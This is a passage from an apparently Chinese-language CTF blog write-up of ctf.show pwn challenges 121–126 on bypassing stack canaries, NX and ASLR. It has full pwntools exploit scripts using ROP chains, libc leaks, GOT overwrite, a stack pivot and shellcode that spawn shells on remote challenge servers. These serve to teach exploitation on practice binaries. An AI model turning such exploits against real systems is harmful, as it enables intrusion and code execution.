class="line">p.send(payload)</span><br><span class="line">sleep(0.5)</span><br><span class="line">p.recvuntil(&quot;See you next time!\n&quot;)</span><br><span class="line">puts_addr = u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&quot;puts&quot;)</span><br><span class="line"></span><br><span class="line"># 由于使用的不是题目虚拟机，这里也就没有对应的libc库，所以直接用wp里面给的，当然也可以直接把可能的libc全试一遍，但是这里就不这么做了。</span><br><span class="line"></span><br><span class="line"># 正确的libc是libc6_2.27-3ubuntu1.6_amd64</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + 0x4f302</span><br><span class="line"></span><br><span class="line">payload = p64(one_gadget)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="pwn121"><a href="#pwn121" class="headerlink" title="pwn121"></a>pwn121</h4><p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240910160210497.png" alt="image-20240910160210497"></p>
<p>64bit，relro为partial，开启了canary和nx</p>
<p>前面的长话短说，直接快进到漏洞点</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240910213912660.png" alt="image-20240910213912660"></p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240910214047389.png" alt="image-20240910214047389"></p>
<p>在sub_401148函数中的sub_400e76函数，也就是图中的read_str函数，第二个参数dword_606110+1之后会被转化为unsigned int，此处就存在一个整数下溢漏洞。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn121&#x27;)</span><br><span class="line">#p = process(&#x27;../pwn121&#x27;)</span><br><span class="line">#p = gdb.debug(&#x27;../pwn121&#x27;,&#x27;b main&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28194)</span><br><span class="line"></span><br><span class="line">message_pattern = 0x6061c0</span><br><span class="line">puts_plt = elf.sym[&#x27;puts&#x27;]</span><br><span class="line">print(hex(puts_plt))</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">print(hex(puts_got))</span><br><span class="line">readn = 0x400f1e</span><br><span class="line">pop_rdi = 0x4044d3</span><br><span class="line">pop_rsi_r15 = 0x4044d1</span><br><span class="line">ret = 0x40150d</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;option:\n&#x27;)</span><br><span class="line">p.sendline(&#x27;1&#x27;)</span><br><span class="line">p.sendline(&#x27;No&#x27;)</span><br><span class="line">p.sendline(&#x27;yes&#x27;)</span><br><span class="line">p.sendline(&#x27;-2&#x27;)</span><br><span class="line"></span><br><span class="line"># 这里是37*8，是因为sub_400E76的第一个参数是a1，在函数的执行过程中，将读取到的字符串拼接到a1的末尾，而a1就是sub_401148中的s1，s1的位置是[rbp-120h]，由此可得offset = 37*8，在这个过程中是不会触发__stack_chk_fail函数的，因为read每次都是存储在buf的位置，只存储一个字符。</span><br><span class="line"></span><br><span class="line">payload = p64(message_pattern)*37 + p64(ret)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"># sub_400f1e(byte_6061c0,0x400ull)读取了payload，如果在byte_6061c0中没有.(47)的话，就抛出异常</span><br><span class="line">payload = p64(0) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(message_pattern + 0x50) + p64(pop_rsi_r15) + p64(1024) + p64(message_pattern + 0x50) + p64(readn)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(&#x27;pattern:\n&#x27;)</span><br><span class="line">puts = u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(puts))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;,puts)</span><br><span class="line">libc_base = puts - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">one_gadget = libc_base + 0x4f302</span><br><span class="line">payload = p64(one_gadget)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>

<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240913003241528.png" alt="image-20240913003241528"></p>
<p>修改了rbp的语句，在_Unwind_RaiseException中，修改了rbp</p>
<p>ret &#x3D; 0x40150d是因为在catch的过程中，0x40150d会变成0x40155d，最终指向0x40155f，也就是leave_ret，实现栈迁移的效果。也就是最终的ret指向跟初始的ret指向是偏移了0x50的，也就是说令ret &#x3D; 0x401509 - 0x40150f之间的任意值都可以。</p>
<p>至于是在哪一个函数的语句中变的，不知道，调得心态崩了，只知道是偏移了0x50</p>
<h4 id="pwn122"><a href="#pwn122" class="headerlink" title="pwn122"></a>pwn122</h4><p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240913173233562.png" alt="image-20240913173233562"></p>
<p>32bit，relro为partial，canary和nx为yes</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240916213926198.png" alt="image-20240916213926198"></p>
<p>跟进sub_80488c6函数</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240916214021356.png" alt="image-20240916214021356"></p>
<p>发现如果出现h的话就增加3个字符，相比于其他字母都是一个一个的增加来说，多出了两个字符，也就是说，如果输入很多个h的话，就会发生栈溢出。</p>
<p>此处注意一个小细节，dest的位置为ebp+8，而src的位置为ebp-10c，也就是说dest在溢出的范围内，那么通过strcpy函数，就可以实现任意地址写入。但是由于canary的存在，无法泄露出canary的情况下，在完成溢出之后就会执行<code>__stack_chk_fail</code>函数，所以程序的执行流会指向<code>__stack_chk_fail</code>函数，如果我们对<code>__stack_chk_fail</code>函数的got进行修改，就可以修改程序的执行流。</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240916215425854.png" alt="image-20240916215425854"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn122&#x27;)</span><br><span class="line">#p = process(&#x27;../pwn122&#x27;)</span><br><span class="line">#p = gdb.debug(&#x27;../pwn122&#x27;,&#x27;b *0x08048BB3&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28202)</span><br><span class="line"></span><br><span class="line">pop_ebp_ret = 0x8048b01</span><br><span class="line">pop_edi_ebp_ret = 0x8048b00</span><br><span class="line">leave_ret = 0x8048a6e</span><br><span class="line">puts = elf.sym[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">stack_chk_fail = 0x804b01c</span><br><span class="line">readline = 0x080486cb</span><br><span class="line">fix_printf = 0x80484b6</span><br><span class="line">ret = 0x804846a</span><br><span class="line">buf = 0x804bcf0</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;Your choice: &#x27;)</span><br><span class="line">p.sendline(&#x27;1&#x27;)</span><br><span class="line">sleep(0.5)</span><br><span class="line"># 前面的是覆盖到ret，其实就一个ret有用，后面的全写成a和h就行</span><br><span class="line">payload = p32(ret) + 8*b&#x27;a&#x27; + p32(fix_printf) + b&#x27;0&#x27; + b&#x27;h&#x27;*85 </span><br><span class="line"># 栈溢出之后会执行的内容，这里其实是通过修改stack_chk_fail函数的内容对canary进行了绕过</span><br><span class="line"># 将ebp赋值为stack_chk_fail方便栈迁移，puts输出puts_got的地址，pop_ebp_ret弹出puts_got的地址，以执行readline(0x01010101,buf)，然后继续弹出不需要的参数，直到buf-4，使用leave_ret完成栈迁移。</span><br><span class="line">payload += p32(pop_ebp_ret) + p32(stack_chk_fail) + p32(puts) + p32(pop_ebp_ret) + p32(puts_got) + p32(readline) + p32(pop_edi_ebp_ret) + p32(buf) + p32(0x01010101) + p32(pop_ebp_ret) + p32(buf-4) + p32(leave_ret) + b&#x27;\n&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;Your choice: &#x27;)</span><br><span class="line">p.sendline(&#x27;4&#x27;)</span><br><span class="line">puts = u32(p.recvrepeat(0.5)[:4])	</span><br><span class="line">print(hex(puts))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;,puts)</span><br><span class="line">libc_base = puts - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">system = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">payload = p32(system) + p32(0) + p32(bin_sh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行strcpy之后的stack_chk_fail函数</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240917151543837.png" alt="image-20240917151543837"></p>
<p>执行call stack_chk_fail指令之后，程序的执行流指向了stack_chk_fail函数，esp-4，并且值为call stack_chk_fail指令的下一条指令，也就是leave。</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240917155318630.png" alt="image-20240917155318630"></p>
<p>本地复现不出来，不知道为啥，打印不出put@got的地址，远程也打不出来，没有符合条件的libc库，所以就知道个原理就好了，就是这样，其实能成功主要还是有一个strcpy函数，而且第一个参数还是可控的，不然半点办法没有。</p>
<h5 id="swtich函数的实现"><a href="#swtich函数的实现" class="headerlink" title="swtich函数的实现"></a>swtich函数的实现</h5><p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240913182320997.png" alt="image-20240913182320997"></p>
<p>先判断是否小于等于7，满足条件的乘4之后加上偏移值，指向不同代码块</p>
<h5 id="call指令知识补充"><a href="#call指令知识补充" class="headerlink" title="call指令知识补充"></a>call指令知识补充</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">在 x86 架构（32 位）下，`call` 指令执行后，`esp` 的变化与调用约定和栈的操作密切相关。</span><br><span class="line"></span><br><span class="line">### `call` 指令的工作原理：</span><br><span class="line">1. **跳转到目标地址**：`call` 指令用于跳转到一个函数或子例程的地址。</span><br><span class="line">2. **保存返回地址**：在跳转之前，`call` 会将当前指令的下一条指令的地址（也就是 `eip + 4`，即 `call` 指令执行完后，下一条指令的位置）压入栈中。这是因为在函数执行完成后，必须知道返回到哪里继续执行。</span><br><span class="line"></span><br><span class="line">### `call` 指令对 `esp` 的影响：</span><br><span class="line">- `call` 执行后，**`esp`（栈指针）减少了 4**，因为栈是向下增长的，每次压栈操作会减小 `esp` 的值。</span><br><span class="line">- 栈顶（`esp` 所指向的内存地址）现在保存了返回地址。</span><br><span class="line"></span><br><span class="line">### 示例：</span><br><span class="line"></span><br><span class="line">```asm</span><br><span class="line">0x08048400 &lt;main&gt;:     call   0x080483f0  ; 调用目标地址 0x080483f0</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">1. **执行 `call` 指令之前：**</span><br><span class="line">   - 假设当前 `esp = 0xffffd0a0`。</span><br><span class="line">   - 栈状态（简化）：</span><br><span class="line"></span><br><span class="line">   ```</span><br><span class="line">   esp -&gt; 0xffffd0a0: [ 栈顶，未使用 ]</span><br><span class="line">   ```</span><br><span class="line"></span><br><span class="line">2. **执行 `call` 指令之后：**</span><br><span class="line">   - `esp` 被减小 4 字节，变成 `esp = 0xffffd09c`。</span><br><span class="line">   - 返回地址（即下一条指令的地址）被压入栈中。</span><br><span class="line"></span><br><span class="line">   栈状态变为：</span><br><span class="line"></span><br><span class="line">   ```</span><br><span class="line">   esp -&gt; 0xffffd09c: [ 0x08048404 ]  ; call 指令之后的下一条指令地址</span><br><span class="line">   ```</span><br><span class="line"></span><br><span class="line">3. **`eip`（指令指针）跳转到 `call` 的目标地址**，即 `0x080483f0` 处继续执行。</span><br><span class="line"></span><br><span class="line">### 总结：</span><br><span class="line">- **执行 `call` 指令后，`esp` 减少 4 字节**，并且栈顶保存了返回地址。</span><br><span class="line">- 当调用的函数执行完毕，`ret` 指令会从栈中弹出这个返回地址，并跳转回去继续执行。</span><br></pre></td></tr></table></figure>

<h4 id="pwn123"><a href="#pwn123" class="headerlink" title="pwn123"></a>pwn123</h4><p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240917163607496.png" alt="image-20240917163607496"></p>
<p>32bit，开启了canary和nx，还有partial的relro</p>
<p>题目比较简单，分析一下函数的逻辑就可以知道怎么写了</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240917165033465.png" alt="image-20240917165033465"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn123&#x27;)</span><br><span class="line">#p = process(&#x27;../pwn123&#x27;)</span><br><span class="line">#p = gdb.debug(&#x27;../pwn123&#x27;,&#x27;b main&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28174)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">init0 = elf.sym[&#x27;init0&#x27;]</span><br><span class="line">offset = 14</span><br><span class="line">p.sendline(&#x27;zx&#x27;)</span><br><span class="line">p.sendline(&#x27;1&#x27;)</span><br><span class="line">p.sendline(str(offset))</span><br><span class="line">p.sendline(str(init0))</span><br><span class="line">p.sendline(&#x27;0&#x27;)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="pwn124"><a href="#pwn124" class="headerlink" title="pwn124"></a>pwn124</h4><p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240917170239864.png" alt="image-20240917170239864"></p>
<p>32位，啥都没开，只有个partial的relro</p>
<p>函数的逻辑也很清晰，而且在ctfshow函数中会使用call执行你输入的内容</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240917170820310.png" alt="image-20240917170820310"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn124&#x27;)</span><br><span class="line">#p = process(&#x27;../pwn124&#x27;)</span><br><span class="line">#p = gdb.debug(&#x27;../pwn124&#x27;,&#x27;b main&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28217)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.sendline(&#x27;CTFshowPWN&#x27;)</span><br><span class="line">p.send(shellcode)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="strcmp函数知识补充"><a href="#strcmp函数知识补充" class="headerlink" title="strcmp函数知识补充"></a>strcmp函数知识补充</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">`strcmp` 函数是 C 标准库中的一个字符串比较函数，用于比较两个字符串的内容。它的原型定义在 `&lt;string.h&gt;` 头文件中。`strcmp` 函数的主要功能是逐字符比较两个字符串，直到遇到不同的字符或到达字符串的结束符（`&#x27;\0&#x27;`）。</span><br><span class="line"></span><br><span class="line">### 函数原型</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">int strcmp(const char *str1, const char *str2);</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">### 参数</span><br><span class="line"></span><br><span class="line">- `str1`：指向第一个要比较的字符串。</span><br><span class="line">- `str2`：指向第二个要比较的字符串。</span><br><span class="line"></span><br><span class="line">### 返回值</span><br><span class="line"></span><br><span class="line">- **小于 0**：如果 `str1` 小于 `str2`（按字典顺序比较），则返回一个负值。</span><br><span class="line">- **等于 0**：如果 `str1` 等于 `str2`，则返回 0。</span><br><span class="line">- **大于 0**：如果 `str1` 大于 `str2`，则返回一个正值。</span><br><span class="line"></span><br><span class="line">### 具体实现</span><br><span class="line"></span><br><span class="line">`strcmp` 函数的实现通常是通过逐个字符比较两个字符串的 ASCII 值来完成的。以下是一个简单的实现示例：</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int my_strcmp(const char *str1, const char *str2) &#123;</span><br><span class="line">    while (*str1 &amp;&amp; (*str1 == *str2)) &#123;</span><br><span class="line">        str1++;</span><br><span class="line">        str2++;</span><br><span class="line">    &#125;</span><br><span class="line">    return *(unsigned char *)str1 - *(unsigned char *)str2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    const char *s1 = &quot;Hello&quot;;</span><br><span class="line">    const char *s2 = &quot;Hello, World!&quot;;</span><br><span class="line">    const char *s3 = &quot;Hello&quot;;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Comparing &#x27;%s&#x27; and &#x27;%s&#x27;: %d\n&quot;, s1, s2, my_strcmp(s1, s2)); // 输出负值</span><br><span class="line">    printf(&quot;Comparing &#x27;%s&#x27; and &#x27;%s&#x27;: %d\n&quot;, s1, s3, my_strcmp(s1, s3)); // 输出正值</span><br><span class="line">    printf(&quot;Comparing &#x27;%s&#x27; and &#x27;%s&#x27;: %d\n&quot;, s1, s1, my_strcmp(s1, s1)); // 输出 0</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">### 使用示例</span><br><span class="line"></span><br><span class="line">以下是一个使用 `strcmp` 函数的示例：</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    const char *str1 = &quot;apple&quot;;</span><br><span class="line">    const char *str2 = &quot;banana&quot;;</span><br><span class="line">    const char *str3 = &quot;apple&quot;;</span><br><span class="line"></span><br><span class="line">    int result1 = strcmp(str1, str2);</span><br><span class="line">    int result2 = strcmp(str1, str3);</span><br><span class="line">    int result3 = strcmp(str2, str1);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Comparing &#x27;%s&#x27; and &#x27;%s&#x27;: %d\n&quot;, str1, str2, result1); // 输出负值</span><br><span class="line">    printf(&quot;Comparing &#x27;%s&#x27; and &#x27;%s&#x27;: %d\n&quot;, str1, str3, result2); // 输出 0</span><br><span class="line">    printf(&quot;Comparing &#x27;%s&#x27; and &#x27;%s&#x27;: %d\n&quot;, str2, str1, result3); // 输出正值</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">### 注意事项</span><br><span class="line"></span><br><span class="line">1. **大小写敏感**：`strcmp` 是大小写敏感的，`&quot;abc&quot;` 和 `&quot;ABC&quot;` 被认为是不同的字符串。</span><br><span class="line">2. **空指针**：在使用 `strcmp` 时，确保传入的字符串指针不是 `NULL`，否则会导致未定义行为。</span><br><span class="line">3. **字符串结束**：`strcmp` 会在遇到字符串结束符 `&#x27;\0&#x27;` 时停止比较。</span><br><span class="line"></span><br><span class="line">### 总结</span><br><span class="line"></span><br><span class="line">`strcmp` 函数是 C 语言中用于比较字符串的基本工具，广泛应用于字符串处理和排序等场景。理解其工作原理和返回值对于有效使用字符串比较非常重要。</span><br></pre></td></tr></table></figure>

<h4 id="pwn125"><a href="#pwn125" class="headerlink" title="pwn125"></a>pwn125</h4><p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240917171537485.png" alt="image-20240917171537485"></p>
<p>64bit，relro为partial，开启了nx</p>
<p>程序逻辑很简单，用ROP也可以写出来，这里看官方wp的意思是注意汇编代码的部分，有一句mov rdi,rsp，也就是说通过scanf也可以调用system函数，而不是使用gadget</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240917172318464.png" alt="image-20240917172318464"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn125&#x27;)</span><br><span class="line">#p = process(&#x27;../pwn125&#x27;)</span><br><span class="line">#p = gdb.debug(&#x27;../pwn125&#x27;,&#x27;b main&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28156)</span><br><span class="line"></span><br><span class="line">call_system = 0x400672</span><br><span class="line">payload = b&#x27;/bin/sh\x00&#x27; + cyclic(0x2000) + p64(call_system)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwn126"><a href="#pwn126" class="headerlink" title="pwn126"></a>pwn126</h4><p>tips:开启NX，但是如果ALSR &#x3D; 0 会发生什么？ [由于远程环境问题，关闭此保护容易引起Docker逃逸等问题，此处远程环境ALSR保护等级为2，但是可以在本地更改为0，并看有什么区别]</p>
<p>注：tips里面写错了，是aslr，不是alsr</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240917202147407.png" alt="image-20240917202147407"></p>
<p>64位，开启了nx和relro:partial</p>
<p>程序很简单，就是演示一下aslr的作用吧，我感觉。解题的话只需要用ret2libc就好了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn126&#x27;)</span><br><span class="line">#p = process(&#x27;../pwn126&#x27;)</span><br><span class="line">#p = gdb.debug(&#x27;../pwn126&#x27;,&#x27;b main&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28297)</span><br><span class="line"></span><br><span class="line">main = elf.sym[&#x27;main&#x27;]</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = 